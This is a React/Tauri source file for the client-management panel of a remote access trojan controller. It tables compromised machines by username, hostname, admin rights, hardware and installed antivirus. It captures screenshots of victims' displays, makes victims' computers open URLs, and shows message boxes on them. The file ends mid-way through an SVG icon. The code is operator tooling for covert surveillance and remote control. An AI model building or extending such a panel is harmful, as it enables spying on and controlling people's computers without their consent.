import {
  IconServer,
  IconSquareRoundedX,
  IconSearch,
  IconFilter,
  IconCpu,
  IconDatabase,
} from "@tabler/icons-react";
import React, { useEffect, useState, useContext, useMemo } from "react";
import { RATContext } from "../rat/RATContext";
import {
  visitWebsiteCmd,
  testMessageBoxCmd,
  sendMessageBoxCmd,
  takeScreenshotCmd,
} from "../rat/RATCommands";

import { ContextMenu } from "../components/ContextMenu";

import { RATClient } from "../../types";

import { ContextMenuType } from "../../types";

import windowsImg from "../assets/732225.png";
import linuxImg from "../assets/pngimg.com - linux_PNG1.png";
import { listen } from "@tauri-apps/api/event";

function ClientDetails({
  client,
  onClose,
}: {
  client: RATClient | null;
  onClose: () => void;
}) {
  if (!client) return null;

  const [screenshot, setScreenshot] = useState<string | null>(null);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        onClose();
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [onClose]);

  async function waitScreenshot() {
    listen("client_screenshot", (event) => {
      setScreenshot(event.payload as string);
    });
  }

  useEffect(() => {
    waitScreenshot();
  }, []);

  async function takeScreenshot(client: RATClient, display: number) {
    await takeScreenshotCmd(client.addr, display);
  }

  return (
    <div className="relative bg-secondarybg p-4 rounded-xl text-white">
      {/* X button */}
      <button
        onClick={onClose}
        className="absolute top-3 right-3 text-accentx hover:text-white transition cursor-pointer"
        aria-label="Close details"
      >
        <IconSquareRoundedX size={32} />
      </button>

      <h2 className="text-lg font-bold mb-2">{client.addr}</h2>

      <div className="mt-4 mb-4">
        <div className="screenshot w-full aspect-[16/9] border border-accentx rounded-xl flex items-center justify-center">
          {screenshot ? (
            <img
              src={`data:image/png;base64,${screenshot}`}
              alt="Screenshot"
              className="h-full rounded-xl"
            />
          ) : (
            <div className="w-full h-full animate-pulse bg-accentx rounded-md" />
          )}
        </div>
      </div>

      <div className="flex flex-row gap-2 mb-2">
        {client &&
          [...Array(client.displays).keys()].map((index) => (
            <a
              key={index}
              onClick={() => takeScreenshot(client, index)}
              className="cursor-pointer rounded-full px-4 py-1.5 border border-accentx bg-secondarybg text-white hover:bg-white hover:text-black transition"
            >
              Capture Display {index}
            </a>
          ))}
      </div>

      <p>
        <span className="text-accentx">Group:</span> {client.group}
      </p>
      <p>
        <span className="text-accentx">OS:</span> {client.os}
      </p>
      <p>
        <span className="text-accentx">Username:</span> {client.username}
      </p>
      <p>
        <span className="text-accentx">Account Type:</span>{" "}
        {client.is_elevated ? "Admin" : "User"}
      </p>
      <p>
        <span className="text-accentx">CPU:</span> {client.cpu}
      </p>
      <p>
        <span className="text-accentx">GPU:</span>
        <br />
        {client.gpus}
      </p>
      <p>
        <span className="text-accentx">RAM:</span> {client.ram}
      </p>
      <p>
        <span className="text-accentx">Drives:</span> {client.storage}
      </p>

      <p>
        <span className="text-accentx">Installed AVs:</span>{" "}
        {client.installed_avs.length > 0
          ? client.installed_avs.join(", ")
          : "None"}
      </p>
    </div>
  );
}

export const Clients = () => {
  const [selectedClient, setSelectedClient] = useState<string>("");
  const [selectedClientDetails, setSelectedClientDetails] =
    useState<RATClient | null>(null);
  const { clientList, fetchClients, running } = useContext(RATContext)!;
  const [contextMenu, setContextMenu] = useState<ContextMenuType | null>(null);

  const [url, setUrl] = useState<string>("");

  const [messageBoxTitle, setMessageBoxTitle] = useState<string>("");
  const [messageBoxContent, setMessageBoxContent] = useState<string>("");
  const [messageBoxButton, setMessageBoxButton] =
    useState<string>("abort_retry_ignore");
  const [messageBoxIcon, setMessageBoxIcon] = useState<string>("error");

  // Search and filter functionality
  const [searchTerm, setSearchTerm] = useState("");

  // Define the type for the filters object
  type FilterCategories = {
    group: Record<string, boolean>;
    os: Record<string, boolean>;
    cpu: Record<string, boolean>;
    gpus: Record<string, boolean>;
  };

  const [filters, setFilters] = useState<FilterCategories>({
    group: {},
    os: {},
    cpu: {},
    gpus: {},
  });
  const [isFilterMenuOpen, setIsFilterMenuOpen] = useState(false);
  const [activeFilterTab, setActiveFilterTab] =
    useState<keyof FilterCategories>("group");

  // Initialize filters based on client properties
  useEffect(() => {
    if (clientList && clientList.length > 0) {
      const groupValues = new Set<string>();
      const osValues = new Set<string>();
      const cpuValues = new Set<string>();
      const gpuValues = new Set<string>();

      clientList.forEach((client: RATClient) => {
        // Add values to respective sets
        groupValues.add(client.group);
        osValues.add(client.os);
        cpuValues.add(client.cpu);

        // Add each GPU to the set
        client.gpus.forEach((gpu) => {
          gpuValues.add(gpu);
        });
      });

      // Initialize filters with all options checked
      const initialFilters: FilterCategories = {
        group: {},
        os: {},
        cpu: {},
        gpus: {},
      };

      // Set initial values for each filter category
      groupValues.forEach((value) => {
        initialFilters.group[value] = true;
      });

      osValues.forEach((value) => {
        initialFilters.os[value] = true;
      });

      cpuValues.forEach((value) => {
        initialFilters.cpu[value] = true;
      });

      gpuValues.forEach((value) => {
        initialFilters.gpus[value] = true;
      });

      setFilters(initialFilters);
    }
  }, [clientList]);

  // Filter clients based on search term and selected filters
  const filteredClients = useMemo(() => {
    return clientList.filter((client: RATClient) => {
      // Check if client matches search term
      const matchesSearch =
        searchTerm === "" ||
        client.addr.toLowerCase().includes(searchTerm.toLowerCase()) ||
        client.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
        client.hostname.toLowerCase().includes(searchTerm.toLowerCase()) ||
        client.ip.toLowerCase().includes(searchTerm.toLowerCase()) ||
        client.os.toLowerCase().includes(searchTerm.toLowerCase()) ||
        client.cpu.toLowerCase().includes(searchTerm.toLowerCase()) ||
        client.ram.toLowerCase().includes(searchTerm.toLowerCase()) ||
        client.gpus.some((gpu) =>
          gpu.toLowerCase().includes(searchTerm.toLowerCase())
        );

      // Check if client passes all filters
      const passesGroupFilter = filters.group[client.group] !== false;
      const passesOsFilter = filters.os[client.os] !== false;
      const passesCpuFilter = filters.cpu[client.cpu] !== false;

      // Check if at least one GPU passes the filter
      const passesGpuFilter = client.gpus.some(
        (gpu) => filters.gpus[gpu] !== false
      );

      return (
        matchesSearch &&
        passesGroupFilter &&
        passesOsFilter &&
        passesCpuFilter &&
        passesGpuFilter
      );
    });
  }, [clientList, searchTerm, filters]);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        setContextMenu(null);
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [contextMenu]);

  const handleContextMenu = (
    event: React.MouseEvent<HTMLDivElement, MouseEvent>,
    addr: string,
    clientFullName: string
  ) => {
    event.preventDefault();
    setSelectedClient(addr);
    setContextMenu({
      x: event.pageX,
      y: event.pageY,
      addr: addr,
      clientFullName,
    });
  };

  const handleVisitWebsite = () => {
    visitWebsiteCmd(String(selectedClient), url);
    (
      document.getElementById("visit_website_modal") as HTMLDialogElement
    ).close();
    setSelectedClient("");
    setSelectedClientDetails(null);
    setUrl("");
  };

  const handleClose = () => {
    setContextMenu(null);
  };

  useEffect(() => {
    if (!running) return;
    fetchClients();
  }, [running]);

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as HTMLElement;
      if (contextMenu && !target.closest(".context-menu")) {
        setContextMenu(null);
      }
    };

    document.addEventListener("mousedown", handleClickOutside);

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [contextMenu]);

  const fetchGpus = (gpus: string[]) => {
    let gpuString = "";

    gpus.forEach((gpu) => {
      gpuString += `${gpu}\n`;
    });

    return gpuString;
  };

  useEffect(() => {
    if (!clientList.some((client) => client.addr === selectedClient)) {
      setSelectedClient("");
      setSelectedClientDetails(null);
    }
  }, [clientList, selectedClient]);

  return (
    <>
      <dialog id="message_box_modal" className="modal">
        <div className="modal-box w-100 bg-primarybg text-white border border-accentx rounded-2xl">
          <h3 className="font-bold text-lg">Show MessageBox</h3>

          <div className="form-control mt-4">
            <label className="input input-bordered flex items-center gap-2 border-accentx bg-secondarybg rounded-3xl">
              <input
                type="text"
                placeholder="Title"
                className="grow"
                value={messageBoxTitle}
                onChange={(e) => setMessageBoxTitle(e.target.value)}
              />
            </label>
          </div>

          <div className="form-control mt-3">
            <label className="input input-bordered flex items-center gap-2 border-accentx bg-secondarybg rounded-3xl">
              <input
                type="text"
                placeholder="Content"
                className="grow"
                value={messageBoxContent}
                onChange={(e) => setMessageBoxContent(e.target.value)}
              />
            </label>
          </div>

          <div className="form-control mt-3">
            <select
              className="select select-bordered border-accentx bg-secondarybg rounded-3xl"
              value={messageBoxButton}
              onChange={(e) => setMessageBoxButton(e.target.value)}
            >
              <option value="abort_retry_ignore">AbortRetryIgnore</option>
              <option value="ok">OK</option>
              <option value="ok_cancel">OKCancel</option>
              <option value="retry_cnacel">RetryCancel</option>
              <option value="yes_no">YesNo</option>
              <option value="yes_no_cancel">YesNoCancel</option>
            </select>
          </div>

          <div className="form-control mt-3">
            <select
              className="select select-bordered border-accentx bg-secondarybg rounded-3xl"
              value={messageBoxIcon}
              onChange={(e) => setMessageBoxIcon(e.target.value)}
            >
              <option value="error">Error</option>
              <option value="question">Question</option>
              <option value="warning">Warning</option>
              <option value="info">Information</option>
              <option value="asterisk">Asterisk</option>
            </select>
          </div>

          <div className="flex flex-row gap-2 mt-4">
            <span
              onClick={() =>
                testMessageBoxCmd(
                  messageBoxTitle,
                  messageBoxContent,
                  messageBoxButton,
                  messageBoxIcon
                )
              }
              className="w-18 btn bg-secondarybg text-white border border-accentx rounded-3xl hover:bg-white hover:text-black transition"
            >
              Test
            </span>
            <span
              onClick={() =>
                sendMessageBoxCmd(
                  String(selectedClient),
                  messageBoxTitle,
                  messageBoxContent,
                  messageBoxButton,
                  messageBoxIcon
                )
              }
              className="w-18 btn bg-secondarybg text-white border border-accentx rounded-3xl hover:bg-white hover:text-black transition"
            >
              Send
            </span>
          </div>
        </div>

        <form method="dialog" className="modal-backdrop">
          <button>close</button>
        </form>
      </dialog>

      <dialog id="visit_website_modal" className="modal">
        <div className="modal-box bg-primarybg text-white w-80 border border-accentx rounded-2xl">
          <h3 className="font-bold text-lg">Visit Website</h3>
          <div className="form-control mt-4 flex flex-col">
            <label className="rounded-3xl pl-4 input input-bordered flex items-center gap-2 border-accentx bg-secondarybg">
              URL
              <input
                type="text"
                placeholder="https://example.com"
                className="grow"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
              />
            </label>

            <span
              onClick={() => handleVisitWebsite()}
              className="w-32 btn mt-4 bg-secondarybg text-white border border-accentx rounded-3xl hover:bg-white hover:text-black transition"
            >
              Visit Website
            </span>
          </div>
        </div>

        <form method="dialog" className="modal-backdrop">
          <button>close</button>
        </form>
      </dialog>

      <div className="flex flex-col h-full">
        {/* Search and filter bar */}
        <div className="flex items-center justify-between gap-2 mb-4 pt-1 px-1 z-99">
          <div className="relative flex-1">
            <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
              <IconSearch className="text-white" size={18} />
            </div>
            <input
              type="text"
              className="bg-secondarybg text-white w-full pl-10 pr-4 py-2 rounded-lg focus:outline-none focus:ring-1 focus:ring-gray-600"
              placeholder="Search clients..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>

          <div className="relative">
            <button
              onClick={() => setIsFilterMenuOpen(!isFilterMenuOpen)}
              className="p-2 rounded-lg bg-white text-black hover:bg-white/80 cursor-pointer transition-colors flex items-center gap-1 border-accentx"
            >
              <IconFilter size={20} />
              <span>Filter</span>
            </button>

            {isFilterMenuOpen && (
              <div className="absolute right-0 mt-2 w-64 rounded-md shadow-lg bg-secondarybg ring-1 ring-black ring-opacity-5 z-50">
                <div className="py-1 px-2">
                  {/* Filter tabs */}
                  <div className="flex border-b border-accentx mb-2">
                    {(
                      ["group", "os", "cpu", "gpus"] as Array<
                        keyof FilterCategories
                      >
                    ).map((tab) => (
                      <button
                        key={tab}
                        className={`px-3 py-2 text-sm font-medium ${
                          activeFilterTab === tab
                            ? "text-white border-b-2 border-white"
                            : "text-gray-400 hover:text-white"
                        }`}
                        onClick={() => setActiveFilterTab(tab)}
                      >
                        {tab.charAt(0).toUpperCase() + tab.slice(1)}
                      </button>
                    ))}
                  </div>

                  {/* Filter options */}
                  <div className="p-2 text-sm font-medium text-white">
                    {activeFilterTab.charAt(0).toUpperCase() +
                      activeFilterTab.slice(1)}
                  </div>

                  <div className="max-h-60 overflow-y-auto">
                    {Object.keys(filters[activeFilterTab]).map(
                      (filterValue: string) => (
                        <div
                          key={filterValue}
                          className="flex items-center px-3 py-2"
                        >
                          <input
                            type="checkbox"
                            id={`${activeFilterTab}-${filterValue}`}
                            checked={
                              filters[activeFilterTab][filterValue] !== false
                            }
                            onChange={() => {
                              setFilters((prev) => ({
                                ...prev,
                                [activeFilterTab]: {
                                  ...prev[activeFilterTab],
                                  [filterValue]:
                                    !prev[activeFilterTab][filterValue],
                                },
                              }));
                            }}
                            className="form-checkbox h-4 w-4 mr-2"
                          />
                          <label
                            htmlFor={`${activeFilterTab}-${filterValue}`}
                            className="ml-2 text-sm text-white cursor-pointer flex-1 truncate"
                            title={filterValue}
                          >
                            {filterValue}
                          </label>
                        </div>
                      )
                    )}
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Main content */}
        <div className="flex flex-row flex-1">
          <div className="flex-1 overflow-auto bg-secondarybg text-black rounded-2xl px-4 sm:px-6 lg:px-8">
            <div className="flow-root">
              <div className="-mx-4 -my-2 sm:-mx-6 lg:-mx-8">
                <div className="inline-block min-w-full py-2 align-middle">
                  <table className="min-w-full border-separate border-spacing-0">
                    <thead>
                      <tr>
                        <th
                          scope="col"
                          className="sticky top-0 z-10 border-b  bg-white/90 py-3.5 pr-3 pl-4 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:pl-6 lg:pl-8"
                        >
                          Address
                        </th>
                        <th
                          scope="col"
                          className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
                        >
                          Group
                        </th>
                        <th
                          scope="col"
                          className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
                        >
                          PC Name
                        </th>
                        <th
                          scope="col"
                          className="sticky top-0 z-10 hidden border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter lg:table-cell"
                        >
                          Account Type
                        </th>
                        <th
                          scope="col"
                          className="sticky top-0 z-10 border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter"
                        >
                          Operating System
                        </th>
                        <th
                          scope="col"
                          className="sticky top-0 z-10 border-b  bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter"
                        >
                          Hardware
                        </th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredClients.length > 0 ? (
                        <>
                          {filteredClients.map((client) => (
                            <tr
                              key={client.addr}
                              onContextMenu={(e) =>
                                handleContextMenu(
                                  e,
                                  client.addr,
                                  `${client.username}@${client.hostname}`
                                )
                              }
                              onClick={() => setSelectedClientDetails(client)}
                              className={`cursor-pointer transition hover:bg-[#1f1f1f] ${
                                selectedClientDetails === client
                                  ? "bg-[#2a2a2a]"
                                  : ""
                              }`}
                            >
                              <td className="border-b border-accentx py-4 pr-3 pl-4 font-medium whitespace-nowrap text-white sm:pl-6 lg:pl-8">
                                {client.addr}
                              </td>
                              <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                                {client.group}
                              </td>
                              <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                                <div className="flex items-center gap-3">
                                  <img
                                    className="w-4"
                                    src={
                                      client.os.includes("Windows")
                                        ? windowsImg
                                        : linuxImg
                                    }
                                    alt="OS"
                                  />
                                  {client.username}@{client.hostname}
                                </div>
                              </td>
                              <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white lg:table-cell">
                                {client.is_elevated ? "Admin" : "User"}
                              </td>
                              <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                                {client.os}
                              </td>
                              <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                                <div className="flex items-center gap-2">
                                  <div
                                    className="tooltip z-50 tooltip-left"
                                    data-tip={client.cpu}
                                  >
                                    <svg
                                      fill="#ffffff"
                                      height="20px"
                                      width="20px"
                                      version="1.1"
                                      id="Capa_1"
                                      xmlns="http://www.w3.org/2000/svg"
                                      viewBox="-14.4 -14.4 208.80 208.80"
                                      stroke="#ffffff"
                                      stroke-width="3.78"
                                    >
                                      <g
                                        id="SVGRepo_bgCarrier"
                                        stroke-width="0"
                                      ></g>
                                      <g
                                        id="SVGRepo_tracerCarrier"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                      ></g>
                                      <g id="SVGRepo_iconCarrier">
                                        {" "}
                                        <path d="M180,169.531V10.469c-2.931,1.615-6.686,1.187-9.171-1.298c-2.485-2.485-2.914-6.24-1.298-9.171H31.905v2.64 c0,2.344-1.899,4.243-4.243,4.243c-2.343,0-4.242-1.899-4.242-4.243V0H10.469c1.616,2.931,1.188,6.686-1.298,9.171 C6.685,11.655,2.931,12.084,0,10.469v159.063c2.931-1.615,6.685-1.187,9.171,1.298c2.485,2.485,2.913,6.24,1.298,9.171H23.42v-2.64 c0-2.344,1.899-4.243,4.242-4.243c2.344,0,4.243,1.899,4.243,4.243V180h137.626c-1.616-2.931-1.188-6.686,1.298-9.171 C173.314,168.345,177.069,167.916,180,169.531z M157.948,136.295c0,11.939-9.714,21.653-21.653,21.653h-22.398 c-3.099,0-5.61-2.512-5.61-5.61c0-3.099,2.512-5.61,5.61-5.61h22.398c5.753,0,10.433-4.68,10.433-10.433v-92.59 c0-5.753-4.68-10.433-10.433-10.433H43.703c-5.751,0-10.431,4.68-10.431,10.433v92.59c0,5.753,4.679,10.433,10.431,10.433h22.4 c3.099,0,5.61,2.512,5.61,5.61c0,3.099-2.512,5.61-5.61,5.61h-22.4c-11.938,0-21.651-9.714-21.651-21.653v-92.59 c0-11.94,9.713-21.653,21.651-21.653h92.592c11.939,0,21.653,9.714,21.653,21.653V136.295z M52.521,134.156 c-3.681,0-6.678-2.994-6.678-6.681V52.524c0-3.687,2.997-6.681,6.678-6.681h74.954c3.687,0,6.681,2.994,6.681,6.681v74.951 c0,3.686-2.994,6.681-6.681,6.681H52.521z M76.316,78.624v4.239h-6.482v-4.676c0-3.116-1.371-4.302-3.554-4.302 c-2.181,0-3.554,1.186-3.554,4.302v23.563c0,3.115,1.373,4.237,3.554,4.237c2.183,0,3.554-1.122,3.554-4.237v-6.233h6.482v5.795 c0,6.983-3.49,10.973-10.223,10.973c-6.733,0-10.223-3.989-10.223-10.973V78.624c0-6.982,3.49-10.972,10.223-10.972 C72.826,67.652,76.316,71.642,76.316,78.624z M90.592,68.151H80.493v43.635h6.856V95.392h3.242c6.856,0,10.223-3.803,10.223-10.783 v-5.674C100.814,71.954,97.448,68.151,90.592,68.151z M93.958,85.045c0,3.116-1.186,4.113-3.366,4.113H87.35V74.385h3.242 c2.181,0,3.366,0.997,3.366,4.113V85.045z M117.646,68.151h6.483v33.225c0,6.982-3.491,10.972-10.224,10.972 c-6.733,0-10.224-3.989-10.224-10.972V68.151h6.857v33.661c0,3.116,1.371,4.238,3.553,4.238c2.183,0,3.554-1.122,3.554-4.238V68.151 z"></path>{" "}
                                      </g>
                                    </svg>
                                  </div>
                                  <div
                                    className="tooltip z-50 tooltip-left"
                                    data-tip={client.ram}
                                  >
                                    <svg
                                      fill="#ffffff"
                                      height="20px"
                                      width="20px"
                                      version="1.1"
                                      id="Capa_1"
                                      xmlns="http://www.w3.org/2000/svg"
                                      viewBox="-20.58 -20.58 298.47 298.47"
                                      stroke="#ffffff"
                                      transform="matrix(1, 0, 0, 1, 0, 0)"
                                      stroke-width="7.204652000000001"
                                    >
                                      <g
                                        id="SVGRepo_bgCarrier"
                                        stroke-width="0"
                                      ></g>
                                      <g
                                        id="SVGRepo_tracerCarrier"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                      ></g>
                                      <g id="SVGRepo_iconCarrier">
                                        {" "}
                                        <path d="M0,107.154h10.761c4.419,0,8,3.582,8,8s-3.581,8-8,8H0v16.502h10.761c4.419,0,8,3.582,8,8c0,4.418-3.581,8-8,8H0v11.998 h37.463v-3.725c0-2.225,1.805-4.025,4.024-4.025c2.221,0,4.025,1.801,4.025,4.025v3.725h37.283v-3.725 c0-2.225,1.805-4.025,4.025-4.025c2.22,0,4.024,1.801,4.024,4.025v3.725h34.393v-8h6.832v8h34.393v-3.725 c0-2.225,1.805-4.025,4.024-4.025c2.221,0,4.025,1.801,4.025,4.025v3.725h37.283v-3.725c0-2.225,1.805-4.025,4.025-4.025 c2.22,0,4.024,1.801,4.024,4.025v3.725h37.463v-11.998h-10.761c-4.419,0-8-3.582-8-8c0-4.418,3.581-8,8-8h10.761v-16.502h-10.761 c-4.419,0-8-3.582-8-8s3.581-8,8-8h10.761v-17.5H0V107.154z M203.987,104.654h17.334v40.667h-17.334V104.654z M173.987,104.654 h17.334v40.667h-17.334V104.654z M143.987,104.654h17.334v40.667h-17.334V104.654z M95.987,104.654h17.334v40.667H95.987V104.654z M65.987,104.654h17.334v40.667H65.987V104.654z M35.987,104.654h17.334v40.667H35.987V104.654z"></path>{" "}
                                      </g>
                                    </svg>
                                  </div>
                                  <div
                                    className="tooltip z-50 tooltip-left"
                                    data-tip={fetchGpus(client.gpus)}
                                  >
                                    <svg
                                      fill="#ffffff"
                                      height="20px"
                                      width="20px"
                                      version="1.1"
                                      id="Capa_1"
                                      xmlns="http://www.w3.org/2000/svg"
                                      xmlnsXlink="http://www.w3.org/1999/xlink"
                                      viewBox="0 0 233.039 233.039"
                                      xmlSpace="preserve"
                                      stroke="#ffffff"
                                      stroke-width="3.2625460000000004"
                                    >
                                      <g
                                        id="SVGRepo_bgCarrier"
                                        stroke-width="0"
                                      ></g>
                                      <g
                                        id="SVGRepo_tracerCarrier"
                                        stroke-linecap="round"
                                        stroke-linejoin="round"
                                      ></g>
                                      <g id="SVGRepo_iconCarrier">
                                        {" "}
                                        <path d="M0,38.413h36.121v144.713H20.416v-13.012h-6.418v-37.155h6.418v-27.013h-6.418V68.792h6.418V54.118H0V38.413z M233.039,87.687V169.6c0,6.938-5.624,12.566-12.563,12.566h-0.013v12.46h-80.221v-12.46h-7.612v12.46H52.409v-12.46h-7.034V75.125 h175.101C227.415,75.125,233.039,80.749,233.039,87.687z M62.52,181.542h-4v9h4V181.542z M70.52,181.542h-4v9h4V181.542z M78.52,181.542h-4v9h4V181.542z M86.52,181.542h-4v9h4V181.542z M88.986,128.805h-9.988v3.925h5.559v1.943 c-2.151,2.514-4.56,3.77-7.229,3.77c-1.166,0-2.248-0.239-3.245-0.72c-0.998-0.479-1.859-1.133-2.584-1.962 c-0.726-0.829-1.297-1.808-1.711-2.935c-0.414-1.127-0.621-2.338-0.621-3.634c0-1.244,0.188-2.423,0.563-3.537 c0.376-1.113,0.907-2.099,1.594-2.954c0.687-0.854,1.516-1.528,2.488-2.021c0.971-0.492,2.04-0.738,3.206-0.738 c1.476,0,2.843,0.362,4.101,1.088c1.256,0.726,2.234,1.775,2.934,3.148l4.004-2.954c-0.934-1.84-2.326-3.304-4.179-4.392 c-1.853-1.089-4.075-1.633-6.665-1.633c-1.918,0-3.692,0.369-5.324,1.107c-1.633,0.739-3.052,1.736-4.256,2.993 c-1.205,1.257-2.151,2.721-2.838,4.392c-0.687,1.671-1.029,3.453-1.029,5.344c0,1.996,0.343,3.854,1.029,5.577 c0.687,1.724,1.619,3.221,2.799,4.489c1.178,1.27,2.564,2.268,4.158,2.993c1.594,0.726,3.297,1.088,5.111,1.088 c2.928,0,5.492-1.101,7.695-3.304v3.109h4.43V128.805z M94.52,181.542h-4v9h4V181.542z M102.52,181.542h-4v9h4V181.542z M110.52,181.542h-4v9h4V181.542z M112.111,115.396H93.572v27.595h5.363v-11.427h10.961v-4.353H98.936v-7.112h13.176V115.396z M118.52,181.542h-4v9h4V181.542z M126.52,181.542h-4v9h4V181.542z M128.396,129.388l9.833-13.992h-5.791l-6.84,10.261l-6.88-10.261 h-5.829l9.833,13.992l-9.522,13.602h5.83l6.568-9.872l6.529,9.872h5.791L128.396,129.388z M150.354,181.542h-4v9h4V181.542z M158.354,181.542h-4v9h4V181.542z M166.354,181.542h-4v9h4V181.542z M174.354,181.542h-4v9h4V181.542z M182.354,181.542h-4v9h4 V181.542z M190.354,181.542h-4v9h4V181.542z M198.354,181.542h-4v9h4V181.542z M206.354,181.542h-4v9h4V181.542z M214.354,181.542 h-4v9h4V181.542z M217.727,130.695c0-19.328-15.67-35-35-35c-19.33,0-35,15.672-35,35c0,19.327,15.67,35,35,35 C202.057,165.695,217.727,150.022,217.727,130.695z M201.575,131.252c0.861-0.464,1.723-0.924,2.57-1.381 c0.841-0.479,1.67-0.951,2.471-1.408c0.804-0.46,1.583-0.902,2.313-1.36c0.057-0.034,0.111-0.068,0.167-0.104 c-0.928-6.684-4.335-12.578-9.268-16.713c-0.068,0.092-0.14,0.192-0.212,0.288c-0.307,0.424-0.652,0.896-1.028,1.413 c-0.402,0.52-0.835,1.082-1.296,1.679c-0.452,0.6-0.964,1.22-1.493,1.864c-0.53,0.647-1.078,1.314-1.634,1.996 c-0.581,0.664-1.17,1.342-1.761,2.023c-0.002,0-0.004,0.003-0.007,0.007c0.041-0.658,0.082-1.326,0.125-2.003 c0.057-0.957,0.072-1.93,0.109-2.903c0.031-0.977,0.063-1.953,0.093-2.914c0.005-0.971,0.008-1.923,0.012-2.847 c0.006-0.927,0.01-1.824-0.021-2.684c0-0.07-0.003-0.13-0.005-0.198c-3.085-1.251-6.452-1.941-9.984-1.941 c-3.208,0-6.281,0.567-9.13,1.604c0.049,0.109,0.099,0.224,0.15,0.337c0.211,0.478,0.45,1.013,0.71,1.6 c0.249,0.606,0.52,1.263,0.805,1.96c0.294,0.692,0.576,1.444,0.868,2.224c0.295,0.786,0.6,1.591,0.908,2.411 c0.288,0.838,0.58,1.688,0.873,2.538c0.001,0.004,0.002,0.005,0.005,0.012c-0.551-0.366-1.107-0.735-1.675-1.112 c-0.798-0.526-1.631-1.027-2.458-1.547c-0.83-0.513-1.661-1.029-2.478-1.536c-0.838-0.487-1.661-0.969-2.459-1.434 c-0.799-0.467-1.573-0.918-2.333-1.323c-0.059-0.032-0.112-0.06-0.17-0.094c-5.087,3.977-8.688,9.76-9.843,16.386 c0.115,0.012,0.235,0.025,0.356,0.035c0.517,0.056,1.102,0.119,1.739,0.187c0.65,0.086,1.354,0.182,2.1,0.284 c0.745,0.089,1.538,0.224,2.361,0.36c0.824,0.137,1.678,0.275,2.543,0.419c0.868,0.169,1.75,0.341,2.632,0.513 c0.004,0,0.007,0,0.012,0c-0.59,0.294-1.188,0.592-1.799,0.896c-0.855,0.428-1.703,0.899-2.567,1.354 c-0.861,0.463-1.723,0.923-2.57,1.38c-0.842,0.479-1.671,0.951-2.471,1.411c-0.804,0.457-1.583,0.902-2.312,1.358 c-0.058,0.034-0.112,0.066-0.169,0.102c0.929,6.686,4.336,12.578,9.269,16.714c0.068-0.092,0.141-0.191,0.212-0.289 c0.307-0.422,0.652-0.895,1.028-1.413c0.401-0.52,0.836-1.081,1.296-1.677c0.452-0.602,0.964-1.222,1.493-1.864 c0.53-0.648,1.077-1.315,1.634-1.994c0.581-0.665,1.17-1.345,1.761-2.023c0.001-0.002,0.004-0.007,0.007-0.009 c-0.041,0.657-0.082,1.324-0.124,2.003c-0.058,0.957-0.074,1.928-0.11,2.903c-0.032,0.976-0.063,1.954-0.094,2.914 c-0.004,0.969-0.007,1.924-0.011,2.846c-0.006,0.928-0.01,1.823,0.02,2.684c0.001,0.069,0.004,0.131,0.004,0.197 c3.085,1.252,6.453,1.942,9.985,1.942c3.208,0,6.281-0.566,9.129-1.605c-0.049-0.108-0.097-0.223-0.149-0.337 c-0.211-0.476-0.45-1.012-0.71-1.598c-0.249-0.607-0.52-1.265-0.804-1.959c-0.294-0.693-0.577-1.447-0.868-2.225 c-0.295-0.784-0.601-1.593-0.908-2.413c-0.289-0.837-0.581-1.688-0.874-2.536c-0.001-0.003-0.002-0.007-0.004-0.013 c0.55,0.368,1.106,0.735,1.674,1.113c0.797,0.524,1.631,1.025,2.458,1.545c0.83,0.514,1.661,1.03,2.478,1.538 c0.838,0.487,1.661,0.969,2.458,1.434c0.8,0.465,1.573,0.918,2.333,1.321c0.06,0.034,0.113,0.062,0.17,0.095 c5.088-3.978,8.688-9.758,9.844-16.385c-0.115-0.013-0.235-0.026-0.356-0.036c-0.518-0.056-1.101-0.117-1.739-0.185 c-0.65-0.088-1.355-0.183-2.1-0.287c-0.746-0.087-1.538-0.221-2.361-0.357c-0.824-0.137-1.678-0.276-2.543-0.42 c-0.868-0.169-1.75-0.342-2.632-0.513c-0.004,0-0.007,0-0.012,0c0.59-0.296,1.188-0.593,1.798-0.898 C199.862,132.179,200.711,131.706,201.575,131.252z"></path>{" "}
                                      </g>
                                    </svg>
                                  </div>
                                  <div
                                    className="tooltip z-50 tooltip-left"
                                    data-tip={client.storage}
                                  >
                                    <svg
                                      fill="#ffffff"
                                      height="20px"
                                      width="20px"
                                      version="1.1"
                                      id="Capa_1"
                                      xmlns="http://www.w3.org/2000/svg"
                                      viewBox="0 0 200 200"
                                      stroke="#ffffff"
                                      stroke-width="5.6000000000000005"
                                    >
                                      <g
                                        id="SVGRepo_bgCarrier"
